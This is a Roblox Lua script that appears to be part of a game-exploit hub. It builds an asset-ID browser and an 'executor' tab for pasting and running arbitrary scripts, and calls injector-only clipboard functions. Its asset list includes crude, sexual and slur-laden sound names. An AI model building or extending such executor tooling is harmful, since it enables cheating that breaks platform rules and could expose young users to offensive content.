box["asset image id 2"].Text = "id: empty"
box["asset image id 2"].TextXAlignment = Enum.TextXAlignment.Center
box["asset image id 2"].TextYAlignment = Enum.TextYAlignment.Center
box["asset image id 2"].Parent = box["main frame 1"]
box["asset image id 2"].ZIndex = 19
box["asset image id 2"].Visible = false
box["asset image id 2 text padding"] = Instance.new("UIPadding")
box["asset image id 2 text padding"].PaddingTop = UDim.new(0, -2)
box["asset image id 2 text padding"].Parent = box["asset image id 2"]

box["copy asset id 2 button"].Size = UDim2.new(0, 70, 0, 28)
box["copy asset id 2 button"].Position = UDim2.new(0, 303, 0, 153)
box["copy asset id 2 button"].BackgroundColor3 = box["default background color"]
box["copy asset id 2 button"].BorderColor3 = box["default border color"]
box["copy asset id 2 button"].BorderSizePixel = 1
box["copy asset id 2 button"].TextColor3 = box["default border color"]
box["copy asset id 2 button"].Font = Enum.Font.RobotoMono
box["copy asset id 2 button"].TextSize = 15
box["copy asset id 2 button"].TextScaled = false
box["copy asset id 2 button"].Text = "copy id"
box["copy asset id 2 button"].TextXAlignment = Enum.TextXAlignment.Center
box["copy asset id 2 button"].TextYAlignment = Enum.TextYAlignment.Center
box["copy asset id 2 button"].Parent = box["main frame 1"]
box["copy asset id 2 button"].ZIndex = 19
box["copy asset id 2 button"].Visible = false
box["copy asset id 2 button text padding"] = Instance.new("UIPadding")
box["copy asset id 2 button text padding"].PaddingTop = UDim.new(0, -2)
box["copy asset id 2 button text padding"].Parent = box["copy asset id 2 button"]

box["asset image 3"].Size = UDim2.new(0, 60, 0, 60)
box["asset image 3"].Position = UDim2.new(0, 28, 0, 186)
box["asset image 3"].Image = "rbxassetid://0"
box["asset image 3"].BackgroundColor3 = box["default background color"]
box["asset image 3"].BorderColor3 = box["default border color"]
box["asset image 3"].BorderSizePixel = 1
box["asset image 3"].Parent = box["main frame 1"]
box["asset image 3"].ZIndex = 19
box["asset image 3"].Visible = false

box["asset image name 3"].Size = UDim2.new(0, 280, 0, 27)
box["asset image name 3"].Position = UDim2.new(0, 93, 0, 186)
box["asset image name 3"].BackgroundColor3 = box["default background color"]
box["asset image name 3"].BorderColor3 = box["default border color"]
box["asset image name 3"].BorderSizePixel = 1
box["asset image name 3"].TextColor3 = box["default border color"]
box["asset image name 3"].Font = Enum.Font.RobotoMono
box["asset image name 3"].TextSize = 15
box["asset image name 3"].TextScaled = false
box["asset image name 3"].Text = "empty"
box["asset image name 3"].TextXAlignment = Enum.TextXAlignment.Center
box["asset image name 3"].TextYAlignment = Enum.TextYAlignment.Center
box["asset image name 3"].Parent = box["main frame 1"]
box["asset image name 3"].ZIndex = 19
box["asset image name 3"].Visible = false
box["asset image name 3 text padding"] = Instance.new("UIPadding")
box["asset image name 3 text padding"].PaddingTop = UDim.new(0, -2)
box["asset image name 3 text padding"].Parent = box["asset image name 3"]

box["asset image id 3"].Size = UDim2.new(0, 205, 0, 28)
box["asset image id 3"].Position = UDim2.new(0, 93, 0, 218)
box["asset image id 3"].BackgroundColor3 = box["default background color"]
box["asset image id 3"].BorderColor3 = box["default border color"]
box["asset image id 3"].BorderSizePixel = 1
box["asset image id 3"].TextColor3 = box["default border color"]
box["asset image id 3"].Font = Enum.Font.RobotoMono
box["asset image id 3"].TextSize = 15
box["asset image id 3"].TextScaled = false
box["asset image id 3"].Text = "id: empty"
box["asset image id 3"].TextXAlignment = Enum.TextXAlignment.Center
box["asset image id 3"].TextYAlignment = Enum.TextYAlignment.Center
box["asset image id 3"].Parent = box["main frame 1"]
box["asset image id 3"].ZIndex = 19
box["asset image id 3"].Visible = false
box["asset image id 3 text padding"] = Instance.new("UIPadding")
box["asset image id 3 text padding"].PaddingTop = UDim.new(0, -2)
box["asset image id 3 text padding"].Parent = box["asset image id 3"]

box["copy asset id 3 button"].Size = UDim2.new(0, 70, 0, 28)
box["copy asset id 3 button"].Position = UDim2.new(0, 303, 0, 218)
box["copy asset id 3 button"].BackgroundColor3 = box["default background color"]
box["copy asset id 3 button"].BorderColor3 = box["default border color"]
box["copy asset id 3 button"].BorderSizePixel = 1
box["copy asset id 3 button"].TextColor3 = box["default border color"]
box["copy asset id 3 button"].Font = Enum.Font.RobotoMono
box["copy asset id 3 button"].TextSize = 15
box["copy asset id 3 button"].TextScaled = false
box["copy asset id 3 button"].Text = "copy id"
box["copy asset id 3 button"].TextXAlignment = Enum.TextXAlignment.Center
box["copy asset id 3 button"].TextYAlignment = Enum.TextYAlignment.Center
box["copy asset id 3 button"].Parent = box["main frame 1"]
box["copy asset id 3 button"].ZIndex = 19
box["copy asset id 3 button"].Visible = false
box["copy asset id 3 button text padding"] = Instance.new("UIPadding")
box["copy asset id 3 button text padding"].PaddingTop = UDim.new(0, -2)
box["copy asset id 3 button text padding"].Parent = box["copy asset id 3 button"]

-------------------------------------------------------------------------------------------------------------------------------

box["next page 2 button"].Size = UDim2.new(0, 19, 0, 190)
box["next page 2 button"].Position = UDim2.new(0, 4, 0, 56)
box["next page 2 button"].BackgroundColor3 = box["default background color"]
box["next page 2 button"].BorderColor3 = box["default border color"]
box["next page 2 button"].BorderSizePixel = 1
box["next page 2 button"].TextColor3 = box["default border color"]
box["next page 2 button"].Font = Enum.Font.RobotoMono
box["next page 2 button"].TextSize = 15
box["next page 2 button"].TextScaled = false
box["next page 2 button"].Text = "<"
box["next page 2 button"].TextXAlignment = Enum.TextXAlignment.Center
box["next page 2 button"].TextYAlignment = Enum.TextYAlignment.Center
box["next page 2 button"].Parent = box["main frame 1"]
box["next page 2 button"].ZIndex = 20
box["next page 2 button"].Visible = false
box["next page 2 button text padding"] = Instance.new("UIPadding")
box["next page 2 button text padding"].PaddingTop = UDim.new(0, -5)
box["next page 2 button text padding"].Parent = box["next page 2 button"]

box["previous page 2 button"].Size = UDim2.new(0, 19, 0, 190)
box["previous page 2 button"].Position = UDim2.new(0, 378, 0, 56)
box["previous page 2 button"].BackgroundColor3 = box["default background color"]
box["previous page 2 button"].BorderColor3 = box["default border color"]
box["previous page 2 button"].BorderSizePixel = 1
box["previous page 2 button"].TextColor3 = box["default border color"]
box["previous page 2 button"].Font = Enum.Font.RobotoMono
box["previous page 2 button"].TextSize = 15
box["previous page 2 button"].TextScaled = false
box["previous page 2 button"].Text = ">"
box["previous page 2 button"].TextXAlignment = Enum.TextXAlignment.Center
box["previous page 2 button"].TextYAlignment = Enum.TextYAlignment.Center
box["previous page 2 button"].Parent = box["main frame 1"]
box["previous page 2 button"].ZIndex = 20
box["previous page 2 button"].Visible = false
box["previous page 2 button text padding"] = Instance.new("UIPadding")
box["previous page 2 button text padding"].PaddingTop = UDim.new(0, -5)
box["previous page 2 button text padding"].Parent = box["previous page 2 button"]

local assetData = {
	["image IDs"] = {
		{id = "129909577310669", image = "rbxassetid://129909577310669", name = "team noxious icon"},
		{id = "15960576470", image = "rbxassetid://15960576470", name = "flustered group icon"},
		{id = "18743174443", image = "rbxassetid://18743174443", name = "this thing"},

		{id = "15848332855", image = "rbxassetid://15848332855", name = "scary face 1"},
		{id = "112289855511517", image = "rbxassetid://112289855511517", name = "scary face 2"},
		{id = "15296361385", image = "rbxassetid://15296361385", name = "scary face 3"},

		{id = "6964586710", image = "rbxassetid://6964586710", name = "albert 1"},
		{id = "5279633075", image = "rbxassetid://5279633075", name = "albert 2"},
		{id = "2881590247", image = "rbxassetid://2881590247", name = "albert 3"},

		{id = "158118263", image = "rbxassetid://158118263", name = "c00lkidd"},
		{id = "16432013221", image = "rbxassetid://9422866248", name = "k00pkidd"},
		{id = "17315237983", image = "rbxassetid://17315237983", name = "tubers93"},

		{id = "82967466186087", image = "rbxassetid://82967466186087", name = "unable 1"},
		{id = "131018743284620", image = "rbxassetid://131018743284620", name = "unable 2"},
		{id = "92724155258384", image = "rbxassetid://92724155258384", name = "unable 3"},

		{id = "10658141259", image = "rbxassetid://10658141259", name = "cat 1"},
		{id = "18940114328", image = "rbxassetid://18940114328", name = "cat 2"},
		{id = "18250553522", image = "rbxassetid://18250553522", name = "cat 3"},

		{id = "18597845968", image = "rbxassetid://18597845968", name = "dog 1"},
		{id = "15090485132", image = "rbxassetid://15090485132", name = "dog 2"},
		{id = "13351233318", image = "rbxassetid://13351233318", name = "dog 3"},

		{id = "17673617362", image = "rbxassetid://17673617362", name = "untextured 1"},
		{id = "18293870483", image = "rbxassetid://18293870483", name = "untextured 2"},
		{id = "7072801754", image = "rbxassetid://7072801754", name = "untextured 3"},

		{id = "17601760499", image = "rbxassetid://17601760499", name = "roblox administrator badge"},
		{id = "7866786419", image = "rbxassetid://7866786419", name = "roblox shutdown"},
		{id = "15642855997", image = "rbxassetid://15642855997", name = "dark stretched static"},

		{id = "11458001755", image = "rbxassetid://11458001755", name = "ishowspeed 1"},
		{id = "11428716493", image = "rbxassetid://11428716493", name = "ishowspeed 2"},
		{id = "13027852586", image = "rbxassetid://13027852586", name = "ishowspeed 3"},

		{id = "13839982198", image = "rbxassetid://13839982198", name = "kreekcraft 1"},
		{id = "14207103524", image = "rbxassetid://14207103524", name = "kreekcraft 2"},
		{id = "12030892645", image = "rbxassetid://12030892645", name = "kreekcraft 3"},

		{id = "85312612489831", image = "rbxassetid://85312612489831", name = "shedletsky"},
		{id = "172423468", image = "rbxassetid://172423468", name = "shedletsky 2"},
		{id = "3359602672", image = "rbxassetid://3359602672", name = "shedletsky 3"},

		{id = "131178173049173", image = "rbxassetid://131178173049173", name = "10000x10000 test"},
		{id = "89442759973598", image = "rbxassetid://89442759973598", name = "20000x20000 test"},
		{id = "82751535106374", image = "rbxassetid://82751535106374", name = "30000x30000 test"},
	},
	["sound IDs"] = {
		{id = "76578817848504", name = "jumpstyle"},
		{id = "1839247124", name = "jumpstyle 2"},
		{id = "1839246711", name = "jumpstyle 2 (extended)"},

		{id = "688596285", name = "man crying"},
		{id = "7014161416", name = "woman crying"},
		{id = "7046088029", name = "robot rock loop"},

		{id = "16190757458", name = "skibidi fanum tax"},
		{id = "2847278264727", name = "#brooklynbloodpop! - syko (external)"},
		{id = "113568851878579", name = "mangos funk (pitch 0.15)"},

		{id = "7999878400", name = "phonk 1"},
		{id = "7601924770", name = "phonk 2"},
		{id = "7764635032", name = "phonk 3"},

		{id = "1947282747182747", name = "lovely bastards funk - dj vttt77 (external)"},
		{id = "1636291836383658", name = "onlyfans - bibi babydoll (external)"},
		{id = "193648262648483626", name = "montagem felicidade expressiva (slowed) (external)"},

		{id = "5672354144", name = "packing"},
		{id = "132760245482684", name = "you diggin in me"},
		{id = "111281710445018", name = "palm tree funk"},

		{id = "8031609997", name = "pornhub intro"},
		{id = "5854877338", name = "want a break from the ads?"},
		{id = "8119768185", name = "bing chilling"},

		{id = "9059013830", name = "why this game so fun chat"},
		{id = "9074555470", name = "they need to die"},
		{id = "9059015332", name = "man what the f"},

		{id = "5228173823", name = "gangsta paradise loop remix"},
		{id = "3200130016", name = "you are an idiot"},
		{id = "4809574295", name = "fart"},

		{id = "85833437298815", name = "smezir (slowed)"},
		{id = "73154534382655", name = "lieu - drain"},
		{id = "104458998006537", name = "sesame street beat"},

		{id = "133898039428349", name = "who made that mess"},
		{id = "81044979151859", name = "burger king plane incident"},
		{id = "98238687813546", name = "teach me"},

		{id = "133848133672814", name = "fire ass rap"},
		{id = "127524384782205", name = "fire ass rap 2"},
		{id = "70972281874046", name = "fire ass rap 3"},

		{id = "1937462828462817367", name = "ela joga na hora (slowed) (external)"},
		{id = "194728264781726473", name = "baile de coquiero 7 (external)"},
		{id = "1947472828477282", name = "montagem voltar (external)"},

		{id = "128900322878891", name = "drillbeat"},
		{id = "86471321003271", name = "hardstyle with static"},
		{id = "79744099014827", name = "foreign with static"},

		{id = "77505226120358", name = "sex scene 1"},
		{id = "83877924327587", name = "sex scene 2"},
		{id = "04440404404040440", name = "reality - axius link (external)"},

		{id = "88723844725910", name = "cooking with kya"},
		{id = "18462937481827373", name = "crow song - sanguinarius (external)"},
		{id = "125865426218084", name = "call me a good boy"},

		{id = "111092240241909", name = "hard ass jumpstyle"},
		{id = "21937418364728284", name = "funk bad do bad - dj vttt77 (external)"},
		{id = "18841896412", name = "hardstyle"},

		{id = "133828158357528", name = "foreign - lungskull"},
		{id = "88064647826500", name = "congo funk"},
		{id = "117764575764380", name = "people who annoy you"},

		{id = "85911347599135", name = "twice n word"},
		{id = "123619245101939", name = "its going down now"},
		{id = "1737483827468439", name = "you are pressed!! - lieu (external)"},

		{id = "183646282846472", name = "headlock - imogen heap (external)"},
		{id = "96762704171712", name = "snickers"},
		{id = "117562011395992", name = "brazilian funk"},

		{id = "78527071535561", name = "!? - lungskull instrumental"},
		{id = "86412047196482", name = "toxic - d3r & 6arelyhuman"},
		{id = "98731775607694", name = "skibidi dop dop dop yes yes"},

		{id = "91922658560009", name = "bodypartz instrumental"},
		{id = "18841888868", name = "love bomb - d3r"},
		{id = "92086395940466", name = "yes king"},

		{id = "19374822837282737", name = "piano tiles - armani west (external)"},
		{id = "79494113906358", name = "toby smiles"},
		{id = "118898127559047", name = "WHO IS GOD!?!?!"},

		{id = "90124981325233", name = "clapping noises???"},
		{id = "110733237958023", name = "fuck me"},
		{id = "94356638905764", name = "ambasing"},

		{id = "18599504383", name = "bumpin that"},
		{id = "138478944413457", name = "met you party"},
		{id = "110472251959955", name = "eviljordan"},

		{id = "135844480028738", name = "king owns"},
		{id = "91256110982700", name = "till you use your mind"},
		{id = "106130561648076", name = "listen listen listen"},

		{id = "107537681782154", name = "stretchin"},
		{id = "75069501268805", name = "gimme that dih"},
		{id = "400004444044044", name = "wutiwant - saraunh0ly"},

		{id = "104387056593435", name = "its getting harder"},
		{id = "103232206651699", name = "gargling???"},
		{id = "94104195286244", name = "kiss of life"},

		{id = "110306698850969", name = "i dont like"},
		{id = "118730057421267", name = "trench boy"},
		{id = "104789232753644", name = "forgot the name"},

		{id = "9774647115329", name = "comet"},
		{id = "124176387786425", name = "teach me full"},
		{id = "18246618364758572", name = "montagem tabo (super slowed) (external)"},

		{id = "130262136847701", name = "chicken jockey"},
		{id = "89760217888895", name = "i am steve"},
		{id = "134713831368801", name = "god bless you with mountains of silver and gold"},

		{id = "77227669080312", name = "victor dice a joel reggatone version"},
		{id = "912995590639144", name = "angel jumpstyle"},
		{id = "3727154382186353", name = "fragment - slxghter (slowed) (external)"},

		{id = "77567474947048", name = "com medo or some shit idk"},
		{id = "86399734003731", name = "luna bala"},
		{id = "198748194766299", name = "loli - 5ewmet (external)"},

		{id = "957262475728274", name = "im not that innocent instrumental - block 13 (external)"},
		{id = "115563204163268", name = "better off dead"},
		{id = "90364828543378", name = "late - lieu"},

		{id = "123444559489023", name = "cant restart"},
		{id = "97841988407875", name = "munchausen syndrome hardstyle remix"},
		{id = "95038464868319", name = "tayo belli"},

		{id = "96108973029378", name = "cuh"},
		{id = "86127169849996", name = "lady hear me tonight"},
		{id = "93599174452421", name = "around the school"},

		{id = "102216494740042", name = "gangsters"},
		{id = "136280519605481", name = "charli xcx song idk"},
		{id = "193462927464828", name = "krug - dj stonik 1917 (external)"},

		{id = "196634818253957", name = "vanished - crystal castles (external)"},
		{id = "1837471837748471", name = "montagem renicht inesperado (external)"},
		{id = "18364627264728", name = "taca xe - dj tls da zl (external)"},

		{id = "1129483289284747", name = "headlock 1shot jersey remix (external)"},
		{id = "1846418173638182", name = "no hands - waka flocka (external)"},
		{id = "1538163717465828", name = "taco - cblu (external)"},

		{id = "193747197374837164", name = "bas bas kotakbas funk (slowed) (external)"},
		{id = "19374728438288577", name = "clima lindo (slowed) (external)"},
		{id = "194728274626264857", name = "automotivo angelical v4 - dj zk3 (external)"},

		{id = "104846670980072", name = "want to love"},
		{id = "18462827466282645", name = "automotivo rally celestial (external)"},
		{id = "19472625184582173", name = "hunniddolla (external)"},

		{id = "18367181637284636", name = "montagem mexilo estranho jumpstyle version (external)"},
		{id = "18367264627385726", name = "estrela helix (slowed) (external)"},
		{id = "184738292625371357", name = "hypnosaes espectral 2 (slowed) (external)"},
	},
	["gear IDs"] = {
		{id = "16726030", name = "cheeseburger"},
		{id = "13745494", name = "turkey leg"},
		{id = "16214845", name = "cake"},

		{id = "16722267", name = "moneybag"},
		{id = "78730532", name = "body swap potion"},
		{id = "80576967", name = "spray paint"},

		{id = "225921000", name = "rainbow carpet"},
		{id = "99119158", name = "speed coil"},
		{id = "16688968", name = "gravity coil"},

		{id = "10472779", name = "bloxy cola"},
		{id = "10727852", name = "witches brew"},
		{id = "21392199", name = "chocolate milk"},

		{id = "15177716", name = "taco"},
		{id = "12848902", name = "teddy bloxpin"},
		{id = "113328094", name = "lightblox jar"},

		{id = "11563251", name = "fuse bomb"},
		{id = "11450664", name = "slateskin potion"},
		{id = "11419319", name = "healing potion"},

		{id = "120307951", name = "noir periastron psi"},
		{id = "108158379", name = "ivory periastron"},
		{id = "80597060", name = "fake chartreuse periastron gamma"},

		{id = "233520257", name = "joyful periastron epsilon"},
		{id = "73829193", name = "grimgold periastron beta"},
		{id = "2544549379", name = "fall periastron xi"},

		{id = "159229806", name = "rainbow periastron omega"},
		{id = "99119240", name = "crimson periastron mu"},
		{id = "69499437", name = "azure periastron alpha"},

		{id = "80661504", name = "chartreuse periastron gamma"},
		{id = "139577901", name = "festive periastron chi"},
		{id = "93136802", name = "amethyst periastron kappa"},

		{id = "97885508", name = "the general's .45"},
		{id = "116693764", name = "historic timmy gun"},
		{id = "34870758", name = "wormhole tunneler"},

		{id = "130113146", name = "hyperlaser gun"},
		{id = "212296936", name = "red hyperlaser gun"},
		{id = "1427401206", name = "green hyperlaser gun"},

		{id = "94233344", name = "shotgun"},
		{id = "33879504", name = "flamethrower"},
		{id = "11999247", name = "subspace tripmine"},
	}
}

local maxDisplayChars = 35
local scrollSpeed = 5
local pauseDuration = 1
local scrollControllers = {}

for i = 1, 3 do
	scrollControllers[i] = {
		fullText = "",
		displayText = "",
		scrollPosition = 1,
		timer = 0,
		state = "paused", -- paused, forward, backward
		needsScroll = false
	}
end

local function updateScrollingText(dt)
	for i = 1, 3 do
		local controller = scrollControllers[i]

		if not controller.needsScroll then continue end

		controller.timer = controller.timer + dt

		if controller.state == "paused" then
			if controller.timer >= pauseDuration then
				controller.timer = 0
				if controller.scrollPosition == 1 then
					controller.state = "forward"
				else
					controller.state = "backward"
				end
			end
		elseif controller.state == "forward" then
			controller.scrollPosition = math.min(
				controller.scrollPosition + scrollSpeed * dt,
				#controller.fullText - maxDisplayChars + 1
			)

			if controller.scrollPosition >= #controller.fullText - maxDisplayChars + 1 then
				controller.state = "paused"
				controller.timer = 0
			end

			controller.displayText = string.sub(
				controller.fullText,
				math.floor(controller.scrollPosition),
				math.floor(controller.scrollPosition) + maxDisplayChars - 1
			)
			box["asset image name " .. i].Text = controller.displayText

		elseif controller.state == "backward" then
			controller.scrollPosition = math.max(
				controller.scrollPosition - scrollSpeed * dt,
				1
			)

			if controller.scrollPosition <= 1 then
				controller.state = "paused"
				controller.timer = 0
			end

			controller.displayText = string.sub(
				controller.fullText,
				math.floor(controller.scrollPosition),
				math.floor(controller.scrollPosition) + maxDisplayChars - 1
			)
			box["asset image name " .. i].Text = controller.displayText
		end
	end
end

if not scrollingConnection then
	scrollingConnection = game:GetService("RunService").RenderStepped:Connect(updateScrollingText)
end

local originalAssetData = {
	["image IDs"] = {},
	["sound IDs"] = {},
	["gear IDs"] = {}
}

for category, assets in pairs(assetData) do
	for _, asset in ipairs(assets) do
		table.insert(originalAssetData[category], table.clone(asset))
	end
end

local isSearching = false
local currentSearchResults = {}

function searchAssets(searchTerm)
	searchTerm = string.lower(searchTerm)
	if searchTerm == "" then
		isSearching = false
		assetData[assetIdPages[currentAssetIdPageIndex]] = originalAssetData[assetIdPages[currentAssetIdPageIndex]]
		currentpg = 1
		updatePage()
		return
	end

	isSearching = true
	currentSearchResults = {}

	local assetType = assetIdPages[currentAssetIdPageIndex]
	for _, asset in pairs(originalAssetData[assetType]) do
		if string.find(string.lower(asset.name), searchTerm, 1, true) then
			table.insert(currentSearchResults, table.clone(asset))
		end
	end

	assetData[assetType] = currentSearchResults
	currentpg = 1
	updatePage()
end

savedAssetIdPageIndex = 1

assetIdPages = {"image IDs", "sound IDs", "gear IDs"}
currentAssetIdPageIndex = 1
currentpg = 1
assetsPerPage = 3

function updateAssetIdTypeIndicator()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	box["asset id type indicator"].Text = assetType .. " [page " .. currentpg .. "/" .. totalpgs .. "]"
end

function updatePage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local assets = assetData[assetType]
	local totalpgs = math.ceil(#assets / assetsPerPage)

	box["asset id type indicator"].Text = assetType .. " [page " .. currentpg .. "/" .. totalpgs .. "]"

	for i = 1, assetsPerPage do
		local assetIndex = (currentpg - 1) * assetsPerPage + i
		local asset = assets[assetIndex]
		local controller = scrollControllers[i]

		if asset then
			if assetType == "sound IDs" then
				box["asset image " .. i].Image = "rbxassetid://110126477790022"
				box["asset image " .. i].ImageColor3 = box["default text color"]
			elseif assetType == "gear IDs" then
				box["asset image " .. i].Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=" .. asset.id
				box["asset image " .. i].ImageColor3 = Color3.new(1, 1, 1)
			else
				box["asset image " .. i].Image = asset.image or "rbxassetid://0"
				box["asset image " .. i].ImageColor3 = Color3.new(1, 1, 1)
			end

			controller.fullText = asset.name or "empty"
			controller.needsScroll = #controller.fullText > maxDisplayChars

			if controller.needsScroll then
				controller.scrollPosition = 1
				controller.timer = 0
				controller.state = "paused"
				controller.displayText = string.sub(controller.fullText, 1, maxDisplayChars)
			else
				controller.displayText = controller.fullText
			end

			box["asset image name " .. i].Text = controller.displayText
			box["asset image id " .. i].Text = "id: " .. (asset.id or "empty")

			box["copy asset id " .. i .. " button"].Name = ""
			box["asset image id " .. i].Name = ""
			box["asset image name " .. i].Name = ""
			box["asset image " .. i].Name = ""

			box["asset image " .. i].BorderColor3 = box["default border color"]
			box["asset image name " .. i].BorderColor3 = box["default border color"]
			box["asset image name " .. i].TextColor3 = box["default text color"]
			box["asset image id " .. i].BorderColor3 = box["default border color"]
			box["asset image id " .. i].TextColor3 = box["default text color"]
			box["copy asset id " .. i .. " button"].Text = "copy id"
			box["copy asset id " .. i .. " button"].BorderColor3 = box["default border color"]
			box["copy asset id " .. i .. " button"].TextColor3 = box["default text color"]
		else
			box["asset image " .. i].Image = "rbxassetid://0"
			box["asset image " .. i].BorderColor3 = box["default 1/2 color 2"]
			box["asset image " .. i].Name = "epicob"
			box["asset image name " .. i].Text = "-"
			box["asset image name " .. i].BorderColor3 = box["default 1/2 color 2"]
			box["asset image name " .. i].TextColor3 = box["default 1/2 color"]
			box["asset image name " .. i].Name = "epico"
			box["asset image id " .. i].Text = "-"
			box["asset image id " .. i].BorderColor3 = box["default 1/2 color 2"]
			box["asset image id " .. i].TextColor3 = box["default 1/2 color"]
			box["asset image id " .. i].Name = "epico"
			box["copy asset id " .. i .. " button"].Text = "-"
			box["copy asset id " .. i .. " button"].BorderColor3 = box["default 1/2 color 2"]
			box["copy asset id " .. i .. " button"].TextColor3 = box["default 1/2 color"]
			box["copy asset id " .. i .. " button"].Name = "epico"
			controller.fullText = "empty"
			controller.displayText = "empty"
			controller.needsScroll = false
		end
	end
end

function nextPage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	currentpg = currentpg + 1
	if currentpg > totalpgs then
		currentpg = 1
	end
	updatePage()
end

function previousPage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	currentpg = currentpg - 1
	if currentpg < 1 then
		currentpg = totalpgs
	end
	updatePage()
end

function nextAssetType()
	local currentType = assetIdPages[currentAssetIdPageIndex]
	if isSearching then
		assetData[currentType] = originalAssetData[currentType]
	end

	currentAssetIdPageIndex = currentAssetIdPageIndex % #assetIdPages + 1
	currentpg = 1
	isSearching = false

	box["asset id search bar"].Text = ""
	updatePage()
end

function previousAssetType()
	local currentType = assetIdPages[currentAssetIdPageIndex]
	if isSearching then
		assetData[currentType] = originalAssetData[currentType]
	end

	currentAssetIdPageIndex = (currentAssetIdPageIndex - 2) % #assetIdPages + 1
	currentpg = 1
	isSearching = false

	box["asset id search bar"].Text = ""
	updatePage()
end

box["asset id search bar"].Changed:Connect(function(property)
	if property == "Text" then
		local searchTerm = box["asset id search bar"].Text
		searchAssets(searchTerm)
	end
end)

box["switch asset id type button"].MouseButton1Click:Connect(function()
	playclicksound()
	previousAssetType()
	savedAssetIdPageIndex = currentAssetIdPageIndex
end)

box["switch asset id type button 2"].MouseButton1Click:Connect(function()
	playclicksound()
	nextAssetType()
	savedAssetIdPageIndex = currentAssetIdPageIndex
end)

box["previous page 2 button"].MouseButton1Click:Connect(function()
	playclicksound()
	nextPage()
end)

box["next page 2 button"].MouseButton1Click:Connect(function()
	playclicksound()
	previousPage()
end)

local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

function toClipboard(txt)
	if everyClipboard then
		everyClipboard(tostring(txt))
		unablenotify("copied to clipboard.")
	else
		unablenotify("unable to access clipboard.")
	end
end

function copyAssetId(assetId)
	toClipboard(assetId)
end

for i = 1, 3 do
	local copyButton = box["copy asset id " .. i .. " button"]
	local assetIdLabel = box["asset image id " .. i]

	copyButton.MouseButton1Click:Connect(function()
		spawn(function() if copyButton.Text == "-" then return end playclicksound() end)
		local assetIdText = assetIdLabel.Text
		local assetId = assetIdText:match("%d+")
		if assetId then
			copyAssetId(assetId)
		end
	end)
end

updatePage()

-------------------------------------------------------------------------------------------------------------------------------

box["executor tab"].Size = UDim2.new(0, 100, 0, 26)
box["executor tab"].Position = UDim2.new(0, 301, 0, 1)

box["executor tab"].BackgroundColor3 = box["default background color"]

box["executor tab"].BorderColor3 = box["default border color"]
box["executor tab"].BorderSizePixel = 1

box["executor tab"].TextColor3 = box["default border color"]
box["executor tab"].Font = Enum.Font.RobotoMono
box["executor tab"].TextSize = 15
box["executor tab"].TextScaled = false
box["executor tab"].Text = "executor"
box["executor tab"].TextXAlignment = Enum.TextXAlignment.Center
box["executor tab"].TextYAlignment = Enum.TextYAlignment.Center

box["executor tab text padding"] = Instance.new("UIPadding")
box["executor tab text padding"].PaddingLeft = UDim.new(0, 0)
box["executor tab text padding"].Parent = box["executor tab"]

box["executor tab"].Parent = box["main frame 1"]
box["executor tab"].ZIndex = 19

box["executor tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
box["executor tab bottom cover"].Position = UDim2.new(0, 301, 0, 27)
box["executor tab bottom cover"].BackgroundColor3 = box["default background color"]
box["executor tab bottom cover"].BorderSizePixel = 0
box["executor tab bottom cover"].Parent = box["main frame 1"]
box["executor tab bottom cover"].ZIndex = 19.5
box["executor tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["executor scrolling frame"].Size = UDim2.new(0, 393, 0, 164)
box["executor scrolling frame"].Position = UDim2.new(0, 4, 0, 32)
box["executor scrolling frame"].BackgroundColor3 = box["default background color"]
box["executor scrolling frame"].BorderColor3 = box["default border color"]
box["executor scrolling frame"].BorderSizePixel = 1
box["executor scrolling frame"].ScrollBarThickness = 8
box["executor scrolling frame"].ScrollBarImageColor3 = box["default 1/2 color"]
box["executor scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
box["executor scrolling frame"].Parent = box["main frame 1"]
box["executor scrolling frame"].ZIndex = 19
box["executor scrolling frame"].Visible = false
box["executor scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

box["executor textbox"].Size = UDim2.new(0, 393, 0, 164)
box["executor textbox"].Position = UDim2.new(0, 0, 0, 0)
box["executor textbox"].BackgroundColor3 = box["default background color"]
box["executor textbox"].BorderColor3 = box["default border color"]
box["executor textbox"].BorderSizePixel = 0
box["executor textbox"].TextColor3 = box["default border color"]
box["executor textbox"].PlaceholderText = "paste script here"
box["executor textbox"].PlaceholderColor3 = box["default 1/2 color"]
box["executor textbox"].Font = Enum.Font.RobotoMono
box["executor textbox"].TextSize = 15
box["executor textbox"].TextScaled = false
box["executor textbox"].Text = "print(\"goodbye world!\")"
box["executor textbox"].TextXAlignment = Enum.TextXAlignment.Left
box["executor textbox"].TextYAlignment = Enum.TextYAlignment.Top
box["executor textbox"].ClearTextOnFocus = false
box["executor textbox"].MultiLine = true
box["executor textbox"].Parent = box["executor scrolling frame"]
box["executor textbox"].ZIndex = 20

box["executor textbox text padding"] = Instance.new("UIPadding")
box["executor textbox text padding"].PaddingLeft = UDim.new(0, 4)
box["executor textbox text padding"].PaddingTop = UDim.new(0, 4)
box["executor textbox text padding"].PaddingBottom = UDim.new(0, 4)
box["executor textbox text padding"].Parent = box["executor scrolling frame"]

function updateCanvas()
	local textBounds = box["executor textbox"].TextBounds
	box["executor textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	box["executor scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)
end

box["executor textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas)

spawn(updateCanvas)

box["execute button"].Size = UDim2.new(0, 158, 0, 45)
box["execute button"].Position = UDim2.new(0, 4, 0, 201)

box["execute button"].BackgroundColor3 = box["default background color"]

box["execute button"].BorderColor3 = box["default border color"]
box["execute button"].BorderSizePixel = 1

box["execute button"].TextColor3 = box["default border color"]
box["execute button"].Font = Enum.Font.RobotoMono
box["execute button"].TextSize = 15
box["execute button"].TextScaled = false
box["execute button"].Text = "execute"
box["execute button"].TextXAlignment = Enum.TextXAlignment.Center
